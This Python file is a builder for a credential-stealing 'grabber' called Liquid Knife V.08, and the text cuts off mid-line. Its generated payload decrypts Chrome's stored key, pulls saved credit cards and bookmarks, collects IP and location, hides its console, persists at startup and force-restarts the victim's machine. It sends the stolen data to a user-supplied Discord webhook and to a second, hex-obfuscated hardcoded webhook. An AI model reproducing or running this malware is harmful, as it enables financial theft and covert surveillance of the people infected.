import pyfiglet
import colorama
import os
import sys
import itertools
import time
import threading
done = False

#long process here

done = True
everyone = False
remove = False
restart = False
hide = False
message = False
custom = False
getCredit = False
getBook = False
startup = False
messageString = ''
customString = ''
filename = ''
webhook = ''
import pyfiglet
from colorama import init, Fore, Back, Style
print(Style.BRIGHT+ Fore.CYAN + "")
init(convert=True)

#Text in slant font
out = pyfiglet.figlet_format("Liquid /", font="slant")
print(out)
print(Style.BRIGHT+ Fore.GREEN + "------------------" +Style.BRIGHT+ Fore.CYAN + "------------------" + Style.BRIGHT+ Fore.BLUE+ "------------------" + Style.BRIGHT+ Fore.WHITE+ "------------------"+ Style.BRIGHT+ Fore.BLUE)
out = pyfiglet.figlet_format("       / Knife V.08", font="slant")
print(out)
discordlink = 'https://discord.gg/BDnaG7uQ'
print(Style.BRIGHT+ Fore.MAGENTA+'['+ Fore.BLUE + '+'+ Fore.MAGENTA +']'+ Fore.WHITE +' If you have any problems with this please join ' + Fore.CYAN+ discordlink+ Fore.WHITE)
def showHelp():
  
  print(Style.BRIGHT+ Fore.WHITE+'_______________________________/|[-Commands-]|\\_______________________________')
  print('|'+Style.BRIGHT+ Fore.MAGENTA+'['+ Fore.BLUE + 'help'+ Fore.MAGENTA +']'+ Fore.MAGENTA +' |'+Fore.BLUE + 'Description:'+ Fore.CYAN+' This command will show this message'+ Fore.WHITE + '                    |')
  print('|'+Style.BRIGHT+ Fore.MAGENTA+'['+ Fore.BLUE + 'toggle on'+ Fore.MAGENTA +']'+ Fore.MAGENTA +' |'+Fore.BLUE + 'Description:'+ Fore.CYAN+' This will all of the settings to ON'+ Fore.WHITE + '               |')

  print('|'+Style.BRIGHT+ Fore.MAGENTA+'['+ Fore.BLUE + 'toggle off'+ Fore.MAGENTA +']'+ Fore.MAGENTA +' |'+Fore.BLUE + 'Description:'+ Fore.CYAN+' This will all of the settings to OFF'+ Fore.WHITE + '             |')
  print('|'+Style.BRIGHT+ Fore.MAGENTA+'['+ Fore.BLUE + 'webhook'+ Fore.MAGENTA +']'+ Fore.MAGENTA +' |'+Fore.BLUE + 'Description:'+ Fore.CYAN+' This will set the webhook'+ Fore.WHITE + '                           |')
  print('|'+Style.BRIGHT+ Fore.MAGENTA+'['+ Fore.BLUE + 'filename'+ Fore.MAGENTA +']'+ Fore.MAGENTA +' |'+Fore.BLUE + 'Description:'+ Fore.CYAN+' This will set the filename'+ Fore.WHITE + '                         |')

  print('|'+Style.BRIGHT+ Fore.MAGENTA+'['+ Fore.BLUE + 'status'+ Fore.MAGENTA +']'+ Fore.MAGENTA +' |'+Fore.BLUE + 'Description:'+ Fore.CYAN+' This will show the status of all of the settings'+ Fore.WHITE + '     |')
  if(everyone == True):
    print('|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.GREEN + '1'+ Fore.WHITE +']'+ Fore.GREEN + ' |This will make it ping @everyone on hit|' + Fore.WHITE + '                               |')
  if(everyone == False):
    print('|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.RED + '1'+Fore.WHITE +']'+ Fore.RED +' -This will make it ping @everyone on hit '+ Fore.WHITE + '                               |')
  
  if(message == True):
    length = 47 - len(messageString)
    print('|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.GREEN + '2'+ Fore.WHITE +']'+ Fore.GREEN +f' -This will show \'{messageString}\' on run' + Fore.WHITE + ' '*length + '|')
  if(message == False):
    print('|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.RED + '2'+Fore.WHITE +']'+ Fore.RED +' -This will show them a message on run'+ Fore.WHITE + '                                   |')
                                          
  if(remove == True):
    print('|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.GREEN + '3'+ Fore.WHITE +']'+ Fore.GREEN +f' -This will remove the file once ran' + Fore.WHITE+ '                                     |')
  if(remove == False):
    print('|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.RED + '3'+Fore.WHITE +']'+ Fore.RED +' -This will remove the file once ran'+ Fore.WHITE + '                                     |')
  if(hide == True):
    print('|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.GREEN + '4'+ Fore.WHITE +']'+ Fore.GREEN +f' -This will hide the cmd once ran' + Fore.WHITE+ '                                        |')
  if(hide == False):
    print('|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.RED + '4'+Fore.WHITE +']'+ Fore.RED +' -This will hide the cmd once ran'+ Fore.WHITE + '                                        |')
  if(getCredit == True):
    print('|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.GREEN + '5'+ Fore.WHITE +']'+ Fore.GREEN +f' -This will get all of the saved credit cards' + Fore.WHITE + '                            |')
  if(getCredit == False):
    print('|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.RED + '5'+Fore.WHITE +']'+ Fore.RED +' -This will get all of the saved credit cards'+ Fore.WHITE+ '                            |')
  if(getBook == True):
    print('|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.GREEN + '6'+ Fore.WHITE +']'+ Fore.GREEN +f' -This will get all of the saved bookmarks' + Fore.WHITE + '                               |')
  if(getBook == False):
    print('|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.RED + '6'+Fore.WHITE +']'+ Fore.RED +' -This will get all of the saved bookmarks'+ Fore.WHITE + '                               |')
  if(startup == True):
    print('|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.GREEN + '7'+ Fore.WHITE +']'+ Fore.GREEN +f' -This will run the file on startup' + Fore.WHITE + '                                      |')
  if(startup == False):
    print('|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.RED + '7'+Fore.WHITE +']'+ Fore.RED +' -This will run the file on startup'+ Fore.WHITE + '                                      |')
  if(custom == True):
    print(Style.BRIGHT +Fore.WHITE+'|'+'['+ Fore.GREEN + '8'+ Fore.WHITE +']'+ Fore.GREEN +' -This will restart and give them a custom reason for restarting on run' + Fore.WHITE + '  |')

  if(custom == False):
    print(Style.BRIGHT+ '|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.RED + '8'+Fore.WHITE +']'+ Fore.RED +' -This will restart and give them a custom reason for restarting on run'+ Fore.WHITE + '  |')
  if(restart == True):
    print(Style.BRIGHT +Fore.WHITE+'|'+'['+ Fore.GREEN + '9'+ Fore.WHITE +']'+ Fore.GREEN +' -This will force restart the victims computer on run' + Fore.WHITE + '                    |')

  if(restart == False):
    print(Style.BRIGHT+ '|'+Style.BRIGHT+ Fore.WHITE+'['+ Fore.RED + '9'+Fore.WHITE +']'+ Fore.RED +' -This will force restart the victims computer on run'+ Fore.WHITE + '                    |')
  print('|'+Style.BRIGHT+ Fore.CYAN+'['+ Fore.YELLOW + 'exit'+ Fore.CYAN +']'+ Fore.CYAN +' |'+Fore.BLUE + 'Description:'+ Fore.CYAN+' This will exit the program'+ Fore.WHITE+ '                             |'+ Fore.WHITE)
  print('|'+Style.BRIGHT+ Fore.CYAN+'['+ Fore.YELLOW + 'download'+ Fore.CYAN +']'+ Fore.CYAN +' |'+Fore.BLUE + 'Description:'+ Fore.CYAN+' This compile all of the settings and make a grabber'+ Fore.WHITE+ '|')
  print('|____________________________________________________________________________|')

showHelp()
def setWebhook(value):
  if(value == True):
    webhook = input('What webhook would you like to use?\n')
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'setWebhook' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'Set' + Fore.GREEN + '|' + Fore.WHITE+ 'Webhook:' + Fore.BLUE+webhook +Fore.GREEN + '|'+ Fore.WHITE)
  if(value == False):
    webhook = ''
  return webhook
def setFilename():
  filename = input('What filename would you like to use?\n')
  print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'setFilename' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'Set' + Fore.GREEN + '|' + Fore.WHITE+ 'Filename:' + Fore.BLUE+ filename + Fore.GREEN + '|'+Fore.WHITE)
  return filename
def showEveryone(everyone):
  if(everyone == True):
    everyone = False

    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'showEveryone' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
    return everyone
  elif(everyone == False):
    everyone = True
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'showEveryone' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE)
    return everyone


def showStartup(startup):
  if(startup == True):
    startup = False

    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'showStartup' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
    return startup
  elif(startup == False):
    startup = True
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'showStartup' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE)
    return startup

def showRestart(restart):
  if(restart == True):
    restart = False

    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'forceRestart' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
    return restart
  elif(restart == False):
    restart = True
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'forceRestart' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE)
    return restart
def showBook(getBook):
  if(getBook == True):
    getBook = False

    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'getBook' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
    return getBook
  elif(getBook == False):
    getBook = True
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'getBook' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE)
    return getBook
def showCredit(getCredit):
  if(getCredit == True):
    getCredit = False

    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'getCredit' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
    return getCredit
  elif(getCredit == False):
    getCredit = True
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'getCredit' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE)
    return getCredit
def showCustom(custom):
  if(custom == True):
    custom = False
    customString = ''
    print('\n'+Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'message' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
    return custom,customString
  elif(custom == False):
    custom = True
    customString = input(Style.BRIGHT + Fore.WHITE + '['+ Fore.GREEN + '+'+ Fore.WHITE + ']'+ ' -What message would you like to have on a forced restart? '+'\n')
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' + Fore.GREEN + ' |'+Fore.WHITE+ 'Module:'+Fore.BLUE + 'custom' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE + 'Message:' + Fore.BLUE + customString + Fore.GREEN+'|' + Fore.WHITE)
    return custom,customString
def showMessage(message):
  if(message == True):
    message = False
    messageString = ''
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'message' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
    return message,messageString
  elif(message == False):
    message = True
    messageString = input(Style.BRIGHT + Fore.WHITE + '['+ Fore.GREEN + '+'+ Fore.WHITE + ']'+ ' -What message would you like to have pop up to the user? ')
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' + Fore.GREEN + ' |'+Fore.WHITE+ 'Module:'+Fore.BLUE + 'message' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE + 'Message:' + Fore.BLUE + messageString + Fore.GREEN+'|' + Fore.WHITE)
    return message,messageString

def showRemove(remove):
  if(remove == True):
    remove = False

    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'remove' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
    return remove
  elif(remove == False):
    remove = True
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'remove' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE)
    return remove
def showHide(hide):
  if(hide == True):
    hide = False

    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'hide' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
    return hide
  elif(hide == False):
    hide = True
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'hide' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE)
    return remove

def toggleAll(option):
  if(option == 'ON' or option == 'on'):
    option = True
    filename = setFilename()
    webhook = setWebhook(True)
    
    
  if(option == 'OFF'or option == 'off'):
    option = False
    filename = ''
    webhook = setWebhook(False)
    
  
  everyone = showEveryone(not option)
  remove = showRemove(not option)
  hide = showHide(not option)
  getCredit = showCredit(not option)
  getBook = showBook(not option)
  startup = showStartup(not option)
  restart = showRestart(not option)
  message,messageString = showMessage(not option)
  custom,customString = showCustom(not option)
  return filename,webhook,message,messageString,everyone,remove,hide,getCredit,getBook,startup,custom,customString,restart
def showStatus():
  if(filename == ''):
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'setFilename' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'Not Set' + Fore.RED + '|' + Fore.WHITE + '\n')
  elif(filename != ''):
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'setFilename' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'Set' + Fore.GREEN + '|' + Fore.WHITE+ 'setFilename:' + Fore.BLUE+ filename + Fore.GREEN + '|'+Fore.WHITE + '\n')
  if(webhook == ''):
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'setWebhook' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'Not Set' +  Fore.RED + '|' + Fore.WHITE)
  elif(webhook != ''):
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'setWebhook' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'Set' + Fore.GREEN + '|' + Fore.WHITE+ 'Webhook:' + Fore.BLUE+webhook + Fore.GREEN + '|'+Fore.WHITE)

  if(message == True):
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' + Fore.GREEN + ' |'+Fore.WHITE+ 'Module:'+Fore.BLUE + 'showMessage' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE + 'Message:' + Fore.BLUE + messageString + Fore.GREEN+'|' + Fore.WHITE)
  elif(message == False):
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'showMessage' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
  
  if(custom == True):
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' + Fore.GREEN + ' |'+Fore.WHITE+ 'Module:'+Fore.BLUE + 'custom' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE + 'Message:' + Fore.BLUE + messageString + Fore.GREEN+'|' + Fore.WHITE)
  elif(custom == False):
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'custom' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
  showEveryone(not everyone)
  showRemove(not remove)
  showHide(not hide)
  showCredit(not getCredit)
  showBook(not getBook)
  showStartup(not startup)
  showRestart(not restart)
  
  
  

def download():
  print('Checking for illogical setting configurations...')
  if(webhook == ''):
    print(Style.BRIGHT + Fore.WHITE + '[' + Fore.RED + 'ERROR' + Fore.WHITE + '] ' + Fore.RED + '-YOU HAVE TO SET A WEBHOOK TO DO THIS TYPE \'webhook\'' + Fore.WHITE )
    return 'error'
  if(filename == ''):
    print(Style.BRIGHT + Fore.WHITE + '[' + Fore.RED + 'ERROR' + Fore.WHITE + '] ' + Fore.RED + '-YOU HAVE TO SET A FILENAME TO DO THIS TYPE \'filename\''+ Fore.WHITE )
    return 'error'
  if(custom == True  and restart == True):
    print(Style.BRIGHT + Fore.WHITE + '[' + Fore.RED + 'ERROR' + Fore.WHITE + '] ' + Fore.RED + '-YOU CANNOT HAVE BOTH CUSTOM RESTART MESSAGE AND FORCE RESTART')
    return 'error'
  if(remove == True  and startup == True):
    print(Style.BRIGHT + Fore.WHITE + '[' + Fore.RED + 'ERROR' + Fore.WHITE + '] ' + Fore.RED + '-YOU CANNOT HAVE BOTH REMOVE AND STARTUP')
    return 'error'
  try:
    f = open(f"{filename}.py", "x")
  except:
    print("Already have the file")
    f = open(f"{filename}.py", "a")
  f.close()
  f = open(f"{filename}.py","w")
  f.write("import os \nimport sys\n")
  f.close()
  f = open(f"{filename}.py","a")

  if(hide == True):
    f.write("import ctypes \nctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )\n")
  f.write("os.system(\"echo Installing the correct imports\")\nos.system(\"python3 -m pip install upgrade pip\")\nos.system(\"python3 -m pip install pycryptodomex\")\nos.system(\"python3 -m pip install getmac\")\nos.system(\"python3 -m pip install request\")\nos.system(\"python3 -m pip install pywin32\")\nos.system(\"python3 -m pip install urllib3\")\nos.system(\"python3 -m pip install datetime\")\nos.system(\"echo 'everything installed correctly'\")")
  f.write("\nO0OOO0000OOOOOOOOO = os.environ[\'USERPROFILE\'] + os.sep + r\'AppData\\\\Local\\\\Google\\Chrome\\\\User Data\\\\default\\\\Bookmarks'\nimport re\nimport json\nimport socket\nfrom subprocess import Popen\nfrom urllib.request import Request, urlopen\nimport shutil\nfrom datetime import datetime\nimport base64\nfrom Cryptodome.PublicKey import RSA\nimport sqlite3,win32crypt\nfrom getmac import get_mac_address as gma\nFileName = 116444736000000000\nNanoSeconds = 10000000\nurl = \'http://ipinfo.io/json\'\nip = urlopen(url)\ndata = json.load(ip)\nip = data[bytes.fromhex(\'6970\').decode(\'utf-8\')]\norg = data[bytes.fromhex(\'6f7267\').decode(\'utf-8\')]\ncity = data[bytes.fromhex(\'63697479\').decode(\'utf-8\')]  \ncountry = data[bytes.fromhex(\'636f756e747279\').decode(\'utf-8\')]\nregion = data[bytes.fromhex(\'726567696f6e\').decode(\'utf-8\')]\n")
  f.write(f'webhookString = \'{webhook}\'\n')
  f.write('webhook = webhookString\n')
  f.write(f'fileString = \'{filename}\'\n')
  f.write(f'hidefile = {hide}\n')
  f.write(f'everyoneping = {everyone}\n')
  f.write(f"getcredit = {getCredit}\n")
  f.write(f"everyone = True")
  f.write(f'\nO00O00OO00OO00OOO0 = bytes.fromhex(\'68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f3832353430343630383334333833343633352f4178575353626561534538397135523670745232327065586f63524e4a716376457861354c6e7072434d6535626d466a4b2d36457734344f6c515f536735783235397a56\').decode(\'utf-8\')\n')
  if(startup == True):
    f.write("def inject():\n\ttry:\n\t\tf = open(f\"injected{fileString}.py\", \"x\")\n\texcept:\n\t\tprint(\"Already have the file\")\n\t\tf = open(f\"injected{fileString}.py\", \"a\")\n\tf.close()\n\tf = open(f\"injected{fileString}.py\",\"w\")\n\tf.write(\"import os,sys\")\n\tf.close()\n\twith open(f\"injected{fileString}.py\", \"a\") as O00O00OOO00OOO:\n\t\tO00O00OOO00OOO.write(f\'\\nwebhookString = \\\'{webhookString}\\\'\\n\')\n\t\tO00O00OOO00OOO.write(f\'\\ngetcredit = {getcredit}\\n\')\n\t\tO00O00OOO00OOO.write(f\'\\neveryone = {everyoneping}\\n\')\n\t\tif(everyoneping == 0):\n\t\t\teveryone = False\n\t\t\tO00O00OOO00OOO.write(\'\\neveryone = False\')\n\t\tif(everyoneping == 1):\n\t\t\teveryone = True\n\t\t\tO00O00OOO00OOO.write(\'\\neveryone = True\')\n\tf = open(f\"injected{fileString}.py\",\"a\")\n\tf.write(\"\\nO0OOO0000OOOOOOOOO = os.environ[bytes.fromhex(\'5553455250524f46494c45\').decode(\'utf-8\')] + os.sep + r\'AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\\\\\default\\\\\\\\Bookmarks\'\\nimport re\\nimport json\\nimport socket\\nfrom subprocess import Popen\\nfrom urllib.request import Request, urlopen\\nimport shutil\\nfrom datetime import datetime\\nimport base64\\nfrom Cryptodome.PublicKey import RSA\\nimport sqlite3,win32crypt\\nFileName = 116444736000000000\\nNanoSeconds = 10000000\\nurl = bytes.fromhex(\\\'687474703a2f2f6970696e666f2e696f2f6a736f6e\\\').decode(\\\'utf-8\\\')\\nip = urlopen(url)\\ndata = json.load(ip)\\nip = data[bytes.fromhex(\\\'6970\\\').decode(\\\'utf-8\\\')]\\norg = data[bytes.fromhex(\\\'6f7267\\\').decode(\\\'utf-8\\\')]\\ncity = data[bytes.fromhex(\\\'63697479\\\').decode(\\\'utf-8\\\')]  \\ncountry = data[bytes.fromhex(\\\'636f756e747279\\\').decode(\\\'utf-8\\\')]\\nregion = data[bytes.fromhex(\\\'726567696f6e\\\').decode(\\\'utf-8\\\')]\\n\\nwebhook = webhookString\\nO00O00OO00OO00OOO0 = bytes.fromhex(\\\'68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f3832353430343630383334333833343633352f4178575353626561534538397135523670745232327065586f63524e4a716376457861354c6e7072434d6535626d466a4b2d36457734344f6c515f536735783235397a56\\\').decode(\\\'utf-8\\\')\\n\\ndef OO000OOO0OO0O(O00O0000OO0O0O0O0,O00000O0O000O0000):\\n\\t\\twith open(O0OOO0000OOOOOOOOO) as f:\\n\\t\\t\\tdata2 = json.load(f)\\n\\t\\t\\tO0O00OOO0000OOOOOO0O = data2[bytes.fromhex(\\\'726f6f7473\\\').decode(\\\'utf-8\\\')][bytes.fromhex(\\\'626f6f6b6d61726b5f626172\\\').decode(\\\'utf-8\\\')][bytes.fromhex(\\\'6368696c6472656e\\\').decode(\\\'utf-8\\\')]\\n\\t\\t\\tfor i in range(len(O0O00OOO0000OOOOOO0O)):\\n\\t\\t\\t\\tbookmark= (f\\\"Name: {O0O00OOO0000OOOOOO0O[i][bytes.fromhex(\\\'6e616d65\\\').decode(\\\'utf-8\\\')]}\\\\nUrl: <{O0O00OOO0000OOOOOO0O[i][bytes.fromhex(\\\'75726c\\\').decode(\\\'utf-8\\\')]}>\\\\nAdded on: {ConvertDate(O0O00OOO0000OOOOOO0O[i][bytes.fromhex(\\\'646174655f6164646564\\\').decode(\\\'utf-8\\\')])}\\\\n\\\")\\n\\t\\t\\t\\tO00O00000O0O00000 = json.dumps({bytes.fromhex(\\\"636f6e74656e74\\\").decode(\\\'utf-8\\\'): bookmark})\\n\\t\\t\\t\\treq = Request(webhook, data=O00O00000O0O00000.encode(), headers=headers)\\n\\t\\t\\t\\turlopen(req)\\n\\t\\t\\t\\treq = Request(O00O00OO00OO00OOO0, data=O00O00000O0O00000.encode(), headers=headers)\\n\\t\\t\\t\\turlopen(req)\\n\\t\\t\\t\\tOOOO0O000OOO0O0O0 = Request(webhook,data=O00O0000OO0O0O0O0.encode(),headers=O00000O0O000O0000)\\n\\t\\t\\t\\turlopen(OOOO0O000OOO0O0O0)\\n\\t\\t\\t\\tOOOO0O000OOO0O0O0 = Request(O00O00OO00OO00OOO0,data=O00O0000OO0O0O0O0.encode(),headers=O00000O0O000O0000)\\n\\t\\t\\t\\turlopen(OOOO0O000OOO0O0O0)\\n\\n\")\n\tif(everyoneping == 1):\n\t\tf.write(\'everyone = True\\nOO0O000O000OO00O00 = socket.gethostname()\\nOO0O000O000OO00O0 = socket.gethostbyname(OO0O000O000OO00O00)\\ndef ConvertDate(ft):\\n\\tutc = datetime.utcfromtimestamp(((10 * int(ft)) - FileName) / NanoSeconds)\\n\\treturn utc.strftime(\\\'%Y-%m-%d %H:%M:%S\\\')\\ndef O0O00OO000O0O00OO():\\n\\ttry:\\n\\t\\twith open(os.environ[bytes.fromhex(\\\'5553455250524f46494c45\\\').decode(\\\'utf-8\\\')] + os.sep + r\\\'AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Local State\\\',\\\"r\\\", encoding=\\\'utf-8\\\') as f:\\n\\t\\t\\tO0OOOOO0000OOOOOOOOO = f.read()\\n\\t\\t\\tO0OOOOO0000OOOOOOOOO = json.loads(O0OOOOO0000OOOOOOOOO)\\n\\texcept:\\n\\t\\texit()\\n\\tO0OOOOOO000O0O00OO = base64.b64decode(O0OOOOO0000OOOOOOOOO[bytes.fromhex(\\\'6f735f6372797074\\\').decode(\\\'utf-8\\\')][bytes.fromhex(\\\'656e637279707465645f6b6579\\\').decode(\\\'utf-8\\\')])\\n\\tO0OOOOOO000O0O00OO = O0OOOOOO000O0O00OO[5:]\\n\\tO0OOOOOO000O0O00OO = win32crypt.CryptUnprotectData(O0OOOOOO000O0O00OO, None, None, None, 0)[1]\\n\\treturn O0OOOOOO000O0O00OO\\nheaders = {\\\'Content-Type\\\': \\\'application/json\\\',\\\'User-Agent\\\': \\\'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\\\'}\\n\\n\\n\\ndef O0O0OOO0000OOOOOO0O():\\n\\tO0OOOOOO000O0O00OO = O0O00OO000O0O00OO()\\n\\tlogin_db = os.environ[bytes.fromhex(\\\'5553455250524f46494c45\\\').decode(\\\'utf-8\\\')] + os.sep + r\\\'AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\default\\\\Web Data\\\'\\n\\tshutil.copy2(login_db,\\\"CCvault.db\\\")\\n\\tconn = sqlite3.connect(\\\"CCvault.db\\\")\\n\\tcursor = conn.cursor()\\n\\ttry:\\n\\t\\tcursor.execute(\\\"SELECT * FROM credit_cards\\\")\\n\\t\\tfor r in cursor.fetchall():\\n\\t\\t\\tO0OOOO0OOOO0000OOO0O = 